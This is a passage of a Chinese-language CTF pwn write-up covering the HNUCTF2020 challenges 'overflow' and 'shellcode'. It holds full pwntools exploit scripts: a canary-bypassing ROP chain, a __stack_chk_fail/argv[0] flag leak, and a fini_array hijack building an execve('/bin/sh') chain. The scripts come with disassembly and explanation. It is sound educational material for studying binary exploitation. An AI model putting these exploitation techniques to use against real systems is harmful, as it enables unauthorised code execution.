class="number">0</span>:</span><br><span class="line">    log.failure(<span class="string">"Canary is negative!"</span>)</span><br><span class="line">    exit()</span><br><span class="line">log.success(<span class="string">"Canary found: "</span> + str(hex(canary)))</span><br><span class="line"></span><br><span class="line">ROP_chain = [</span><br><span class="line">    canary,</span><br><span class="line">    <span class="number">0x12345678</span>, <span class="number">0x12345678</span>, <span class="number">0x12345678</span>,  <span class="comment"># 3个padding</span></span><br><span class="line">    <span class="number">0x080701aa</span>, <span class="number">0x080ec060</span>, <span class="number">0x0805c34b</span>, u32(<span class="string">"/bin"</span>),</span><br><span class="line">    <span class="number">0x0809b30d</span>, <span class="number">0x080701aa</span>, <span class="number">0x080ec064</span>, <span class="number">0x0805c34b</span>, u32(<span class="string">"//sh"</span>), <span class="number">0x0809b30d</span>,</span><br><span class="line">    <span class="number">0x080701aa</span>, <span class="number">0x080ec068</span>, <span class="number">0x080550d0</span>, <span class="number">0x0809b30d</span>,</span><br><span class="line">    <span class="number">0x080481d1</span>, <span class="number">0x080ec060</span>,</span><br><span class="line">    <span class="number">0x080701d1</span>, <span class="number">0x080ec068</span>, <span class="number">0x080ec060</span>,</span><br><span class="line">    <span class="number">0x080701aa</span>, <span class="number">0x080ec068</span>,</span><br><span class="line">    <span class="number">0x080550d0</span>,</span><br><span class="line">    <span class="number">0x0807cb7f</span>, <span class="number">0x0807cb7f</span>, <span class="number">0x0807cb7f</span>, <span class="number">0x0807cb7f</span>, <span class="number">0x0807cb7f</span>, <span class="number">0x0807cb7f</span>,</span><br><span class="line">    <span class="number">0x0807cb7f</span>, <span class="number">0x0807cb7f</span>, <span class="number">0x0807cb7f</span>, <span class="number">0x0807cb7f</span>, <span class="number">0x0807cb7f</span>,</span><br><span class="line">    <span class="number">0x08049a21</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意要倒着写入栈，因为向高地址栈写入数据会破坏低地址栈写入的数据</span></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(len(ROP_chain) - <span class="number">1</span>, <span class="number">-1</span>, <span class="number">-1</span>):</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendline(<span class="string">"+"</span> + str(canary_offset - <span class="number">1</span> + index)</span><br><span class="line">                + <span class="string">"+"</span> + str(ROP_chain[index]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将输出的大量无用数据全部丢弃</span></span><br><span class="line">io.recv()</span><br><span class="line"><span class="comment"># 输入\n退出calc函数，进入ret</span></span><br><span class="line">io.sendline(<span class="string">""</span>)</span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">log.success(<span class="string">"get shell!"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="2-overflow">2. overflow</h2>
<p>点击 <a href="/2020/02/HNUCTF2020-pwn/pwn4.zip" title="这里">这里</a> 下载题目</p>
<h3 id="易知信息-2">易知信息</h3>
<ul>
<li>
<p>开启 NX 保护，堆栈不可执行</p>
</li>
<li>
<p>开启 <code>Canary</code> 保护，不可直接栈溢出</p>
</li>
<li>
<p>存在栈溢出漏洞</p>
</li>
<li>
<p>.data 段有 <code>flag</code></p>
  <figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">.data:</span>0000000000600D20 <span class="comment">; char byte_600D20[]</span></span><br><span class="line"><span class="symbol">.data:</span>0000000000600D20 byte_600D20     <span class="built_in">db</span> <span class="string">'P'</span>                  <span class="comment">; DATA XREF: vul_func+6E</span></span><br><span class="line"><span class="symbol">.data:</span>0000000000600D21 aCtfHereSTheFla <span class="built_in">db</span> <span class="string">'CTF&#123;Here'</span>,<span class="number">27h</span>,<span class="string">'s the flag on server&#125;'</span>,<span class="number">0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>下载下来的 ELF 文件里的 <code>flag</code> 不是真正的 <code>flag</code> ，但服务器上的 ELF 文件里的 <code>flag</code> 是真的<br>
只要能在本地将假 <code>flag</code> 成功泄露，那么服务器端的 <code>flag</code> 就同样可以泄露成功</li>
</ul>
</li>
<li>
<p>漏洞函数 <code>vul_func</code> 会将第二次输入的数据直接覆盖在 <code>.data</code> 段 <code>flag</code> 字符串上（ <code>flag</code> 地址： <code>0x600D20</code> ），倘若输入的字符串长度没有满 32 字节，那么 <code>memset</code> 就会“帮”我们销毁 <code>flag</code></p>
<blockquote>
<p>总而言之，<code>.data</code> 段上的 <code>flag</code> 一定会被销毁</p>
</blockquote>
</li>
</ul>
<h3 id="分析-2">分析</h3>
<ul>
<li>
<p>ELF 文件在加载进内存时会先映射到内存上的某一块区域，然后再进行段到段的映射</p>
<ul>
<li>换句话说，在虚拟内存中存在一份 ELF 文件拷贝，此拷贝中存在 <code>flag</code> 字符串</li>
</ul>
</li>
<li>
<p>当函数返回时，如果栈上的 <code>Canary</code> 值与 <code>fs:[0x28]</code>上的值不符时，会直接执行<code>___stack_chk_fail</code> 函数，不会 leave_ret。而此函数 glibc 源代码如下：</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//eglibc-2.19/debug/stack_chk_fail.c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function  __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">        msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>__libc_argv[0]</code> 是一个默认指向存放着当前程序名称的指针</p>
</blockquote>
</li>
</ul>
<h3 id="解决方案-2">解决方案</h3>
<ul>
<li>
<p>只要劫持<code>__libc_argv[0]</code>为我们想输出的地址，那就可以通过<code>___stack_chk_fail</code> 函数显示出来</p>
</li>
<li>
<p>思路已经很明确了，劫持 <code>___stack_chk_fail</code> 函数，显示 <code>flag</code> 拷贝的内容</p>
</li>
</ul>
<h4 id="EXP-2">EXP</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"xx.xx.xx.xx"</span>, <span class="number">8016</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 另一份flag拷贝的内存地址</span></span><br><span class="line">flag_addr = <span class="number">0x00400D20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 覆盖__libc_argv[0]，并间接调用___stack_chk_fail函数</span></span><br><span class="line">payload1 = <span class="number">0x44</span> * p64(flag_addr)</span><br><span class="line">io.sendlineafter(<span class="string">"Hello!\nWhat's your name? "</span>, payload1)</span><br><span class="line">io.sendlineafter(<span class="string">"Please  give  me the flag: "</span>, <span class="string">"orz\x00"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="感想">感想</h3>
<ul>
<li>谁知道真假 <code>flag</code> 竟然是同一个，当初得到服务器端的 <code>flag</code> 后犹豫了好久，还以为自己做错了。果然最危险的地方就是最安全的地方 XD</li>
</ul>
<hr>
<h2 id="3-shellcode">3. shellcode</h2>
<p>点击 <a href="/2020/02/HNUCTF2020-pwn/pwn5.zip" title="这里">这里</a> 下载题目</p>
<h3 id="易知信息-3">易知信息</h3>
<ul>
<li>开启<code>NX</code>保护</li>
<li><code>静态编译</code></li>
<li><code>main</code>函数中允许任意地址写入<code>24Bytes</code></li>
<li><code>byte_4B9330</code>存在<code>8bit</code>整数溢出漏洞</li>
</ul>
<h3 id="分析-3">分析</h3>
<ul>
<li>
<p>主函数在任意写之后，必然会执行<code>_libc_csu_fini</code>。其中，还会执行<code>fini_array</code>上指针指向的函数。所以我们可以通过一次性修改<code>fini_array</code>上的<code>两个</code>函数地址，从而无限次<code>ret2main</code>，进而通过<code>整数溢出漏洞</code>进行无限次任意写。即作如下修改：</p>
<blockquote>
<p>正常的执行路径：<code>main</code> -&gt; <code>_libc_csu_fini</code> -&gt; <code>_fini_array[1]</code> -&gt; <code>fini_array[0]</code>  -&gt; <code>_libc_csu_fini</code><br>
无限写的执行路径：<code>main</code> -&gt; <code>_libc_csu_fini</code> -&gt; <code>main</code> -&gt; <code>_libc_csu_fini</code> -&gt; <code>main</code> -&gt; <code>_libc_csu_fini</code> -&gt; <code>...</code><br>
栈劫持的执行路径：<code>...</code> -&gt; <code>main</code> -&gt; <code>leave_ret</code> -&gt; <code>ROP</code> -&gt; <code>shell</code></p>
</blockquote>
</li>
<li>
<p>该程序为静态链接, <code>_libc_csu_fini</code> 会将 <code>rbp</code> 置为 <code>&amp;fini_array[0]</code> ,故可以通过<code>main</code>函数里的任意写，修改<code>fini_array[0]</code>为<code>leave_ret</code>指令的地址， 就可在<code>leave_ret</code>返回时劫持<code>rsp</code>到<code>&amp;fini_array[0]</code>，进而劫持<code>rip</code>。</p>
<ul>
<li>注意，这点的实现前提是该程序为<code>静态链接</code>，因为<code>静态链接</code>和<code>动态链接</code>的<code>_libc_csu_fini</code>的实现是不一样的
<ul>
<li>
<p>静态链接的 <code>_libc_csu_fini</code></p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="comment">; _libc_csu_fini by static linked</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402960</span> sub_402960      proc <span class="built_in">near</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402960</span>                 <span class="keyword">push</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402961</span>                 <span class="keyword">lea</span>     <span class="built_in">rax</span>, unk_4B4100</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402968</span>                 <span class="keyword">lea</span>     <span class="built_in">rbp</span>, off_4B40F0 <span class="comment">; the address of fini_array</span></span><br><span class="line"><span class="symbol">.text:</span>040296F                 <span class="keyword">push</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402970</span>                 <span class="keyword">sub</span>     <span class="built_in">rax</span>, <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402973</span>                 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402977</span>                 <span class="keyword">sar</span>     <span class="built_in">rax</span>, <span class="number">3</span></span><br><span class="line"><span class="symbol">.text:</span>040297B                 <span class="keyword">jz</span>      short loc_402996</span><br><span class="line"><span class="symbol">.text:</span><span class="number">040297D</span>                 <span class="keyword">lea</span>     <span class="built_in">rbx</span>, [<span class="built_in">rax</span>-<span class="number">1</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402981</span>                 <span class="keyword">nop</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>+<span class="number">00000000h</span>]</span><br><span class="line"></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402988</span> loc_402988:</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402988</span>                 <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rbp</span>+<span class="built_in">rbx</span>*<span class="number">8</span>+<span class="number">0</span>] <span class="comment">; call the func_ptrs in fini_array</span></span><br><span class="line"><span class="symbol">.text:</span>040298C                 <span class="keyword">sub</span>     <span class="built_in">rbx</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402990</span>                 <span class="keyword">cmp</span>     <span class="built_in">rbx</span>, <span class="number">0FFFFFFFFFFFFFFFFh</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402994</span>                 <span class="keyword">jnz</span>     short loc_402988</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402996</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402996</span> loc_402996:</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0402996</span>                 <span class="keyword">add</span>     <span class="built_in">rsp</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">.text:</span>040299A                 <span class="keyword">pop</span>     <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>040299B                 <span class="keyword">pop</span>     <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>040299C                 <span class="keyword">jmp</span>     _term_proc</span><br><span class="line"><span class="symbol">.text:</span>040299C sub_402960      endp</span><br><span class="line"></span><br><span class="line"><span class="symbol">.fini:</span>048E32C _term_proc      proc <span class="built_in">near</span></span><br><span class="line"><span class="symbol">.fini:</span>048E32C                 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">.fini:</span>048E330                 <span class="keyword">add</span>     <span class="built_in">rsp</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">.fini:</span>048E334                 <span class="keyword">retn</span></span><br><span class="line"><span class="symbol">.fini:</span>048E334 _term_proc      endp</span><br></pre></td></tr></table></figure>
<ul>
<li>动态链接的 <code>_libc_csu_fini</code></li>
</ul>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="comment">; _libc_csu_fini by dynamic linked</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0400770</span> <span class="comment">; void fini(void)</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0400770</span> fini            proc <span class="built_in">near</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0400770</span>                 <span class="keyword">rep</span> <span class="keyword">retn</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0400770</span> fini            endp</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>通过任意写，我们可以在<code>fini_array</code>中构造ROP链，从而<code>get shell</code>。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="comment">; 刚好这五个ROPgadget在程序中都存在 XD</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">rax</span>   <span class="keyword">ret</span>    <span class="comment">; 0x3b</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">rdi</span>   <span class="keyword">ret</span><span class="comment">;   ; the address of "/bin/sh"</span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">rsi</span>   <span class="keyword">ret</span><span class="comment">;   ; 0  </span></span><br><span class="line"><span class="keyword">pop</span> <span class="built_in">rdx</span>   <span class="keyword">ret</span><span class="comment">;   ; 0</span></span><br><span class="line"><span class="keyword">syscall</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="解决方案-3">解决方案</h3>
<ol>
<li>修改 <code>fini_array[1]</code>上的地址为<code>main</code>、 <code>fini_array[0]</code>上的地址为<code>_libc_csu_fini</code></li>
<li>在<code>fini_array</code>上构建<code>除了第一条ROP</code>的剩余ROP链</li>
<li>将<code>fini_array[0]</code>修改为<code>leave_ret</code>指令的地址、将<code>fini_array[1]</code>修改为<code>第一条ROP指令</code>的地址，从而将ROP链连接起来</li>
<li>待<code>leave_ret</code> 返回，劫持<code>rip</code>, 最后通过ROP链 <code>get shell</code>。</li>
</ol>
<blockquote>
<p>构建ROP链时需注意：<code>leave_ret</code>指令，会使<code>rsp</code>在<code>ret</code>时指向<code>fini_array[1]</code>，所以必须在最后一次执行<code>main</code>函数时同时修改<code>fini_array[0]</code>为<code>leave_ret</code>、修改<code>fini_array[1]</code>为<code>第一条ROP指令</code>的地址，从而补全ROP链<br>
为什么<code>在ret时rsp会指向fini_array[1]</code>呢？看完下面那个表格就知道了</p>
</blockquote>
<blockquote>
<p>|       | <code>-&gt;</code>  <code>mov rsp rbp</code>  | <code>mov rsp rbp</code>  |     <code>mov rsp rbp</code> |<br>
|       |           <code>pop rbp</code>  | <code>-&gt;</code> <code>pop rbp</code> |         <code>pop rbp</code> |</p>
<table>
<thead>
<tr>
<th style="text-align:right"></th>
<th style="text-align:right"><code>ret</code></th>
<th style="text-align:right"><code>ret</code></th>
<th style="text-align:right"><code>-&gt;</code> <code>ret</code></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:right"><code>rbp</code></td>
<td style="text-align:right">&amp;fini_array[0]</td>
<td style="text-align:right">&amp;fini_array[0]</td>
<td style="text-align:right">fini_array[0]</td>
</tr>
<tr>
<td style="text-align:right"><code>rsp</code></td>
<td style="text-align:right">point to stack</td>
<td style="text-align:right">&amp;fini_array[0]</td>
<td style="text-align:right"><code>&amp;fini_array[1]</code></td>
</tr>
</tbody>
</table>
</blockquote>
<h4 id="EXP-3">EXP</h4>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"xx.xx.94.176"</span>, <span class="number">8011</span>)</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment"># context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line">pop_rax_addr = <span class="number">0x000000000041e4af</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x0000000000401696</span></span><br><span class="line">pop_rsi_addr = <span class="number">0x0000000000406c30</span></span><br><span class="line">pop_rdx_addr = <span class="number">0x0000000000446e35</span></span><br><span class="line">syscall_addr = <span class="number">0x00000000004022b4</span></span><br><span class="line">leave_ret_addr = <span class="number">0x0000000000401c4b</span></span><br><span class="line">main_addr = <span class="number">0x0000000000401B6D</span></span><br><span class="line">_libc_csu_fini_addr = <span class="number">0x0000000000402960</span></span><br><span class="line">fini_array_addr = <span class="number">0x00000000004B40F0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(address, data)</span>:</span></span><br><span class="line">    io.sendafter(<span class="string">"addr:"</span>, str(address))</span><br><span class="line">    io.sendafter(<span class="string">"data:"</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改程序执行逻辑</span></span><br><span class="line">write(fini_array_addr, flat(_libc_csu_fini_addr, main_addr))</span><br><span class="line"><span class="comment"># 构建ROP链</span></span><br><span class="line">write(fini_array_addr+<span class="number">8</span>*<span class="number">3</span>, flat(pop_rdi_addr, fini_array_addr+<span class="number">8</span>*<span class="number">10</span>))</span><br><span class="line">write(fini_array_addr+<span class="number">8</span>*<span class="number">5</span>, flat(pop_rsi_addr, <span class="number">0</span>))</span><br><span class="line">write(fini_array_addr+<span class="number">8</span>*<span class="number">7</span>, flat(pop_rdx_addr, <span class="number">0</span>))</span><br><span class="line">write(fini_array_addr+<span class="number">8</span>*<span class="number">9</span>, flat(syscall_addr, <span class="string">"/bin/sh\x00"</span>))</span><br><span class="line"><span class="comment"># 栈劫持并执行ROP，得到shell</span></span><br><span class="line">write(fini_array_addr, flat(leave_ret_addr, pop_rax_addr, <span class="number">0x3b</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="随笔">随笔</h3>
<ul>
<li>这题当初没做出来，复盘时才知道考点是静态链接中 <code>_libc_csu_fini</code> 和 <code>fini_array</code> 的利用</li>
<li>在复盘时，我寻求了大佬的帮助，同时也大量参考了Freebuf里的一篇关于<code>_libc_csu_fini</code> 和 <code>fini_array</code>的利用，不得不说真是收益良多。</li>
<li>复盘时大佬的指点也让我豁然开朗，特此感谢协会大佬的鼓励与支持</li>
<li>原题为<a href="pwnable.tw">pwnable.tw</a> 的 <code>3x17</code></li>
</ul>
<h3 id="参考">参考</h3>
<blockquote>
<p><a href="https://www.freebuf.com/articles/system/226003.html" target="_blank" rel="noopener">详解64位静态编译程序的fini_array劫持及ROP攻击</a><br>
<a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank" rel="noopener">Linux Syscall Reference</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Pwn</tag>
      </tags>
  </entry>
</search>
